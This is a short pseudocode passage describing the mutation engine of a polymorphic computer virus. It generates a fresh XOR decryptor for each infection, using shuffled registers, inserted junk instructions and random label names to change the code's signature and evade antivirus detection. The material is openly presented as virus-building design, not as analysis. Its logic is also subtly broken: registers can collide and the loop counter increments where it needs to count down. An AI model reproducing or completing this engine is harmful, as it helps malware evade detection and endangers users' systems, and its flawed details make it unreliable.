// --------------------------
// 2. Mutation Engine: Generates new unique decryptor per infection
// Changes byte pattern (signature) without changing function
// --------------------------
function GENERATE_MUTATED_DECRYPTOR(key, encrypted_body_length):
  instructions = []
  available_registers = ["R1", "R2", "R3", "R4", "R5"]

  // Step 1: Randomize register allocation (changes byte pattern)
  key_reg = shuffle(available_registers).pop()
  counter_reg = shuffle(available_registers).pop()
  ptr_reg = shuffle(available_registers).pop()

  // Step 2: Insert random junk at start (changes signature)
  for _ in 0..random_int(2, 8):
    junk = random_choice(JUNK_INSTRUCTIONS)
    replace register in junk with random from available_registers
    instructions.append(junk)

  // Step 3: Core decryptor setup with random variations
  instructions.append(f"MOV {key_reg}, #STORED_KEY")
  instructions.append(f"MOV {counter_reg}, #{encrypted_body_length}")

  // Step 4: More random junk between core logic
  for _ in 0..random_int(1, 4):
    instructions.append(random_choice(JUNK_INSTRUCTIONS))

  // Step 5: Core decryption loop with random instruction ordering
  loop_label = f"LOOP_{random_hex(4)}" // Random label name changes byte pattern
  instructions.append(f"{loop_label}:")
  instructions.append(f"XOR [{ptr_reg}], {key_reg}") // Simple XOR decryption
  // Randomize order of increment instructions (same function, different pattern)
  increments = shuffle([f"INC {ptr_reg}", f"INC {counter_reg}"])
  instructions.extend(increments)
  instructions.append(f"JNZ {loop_label}")

  // Step 6: Random junk at end
  for _ in 0..random_int(2, 6):
    instructions.append(random_choice(JUNK_INSTRUCTIONS))

  // Jump to decrypted main virus code
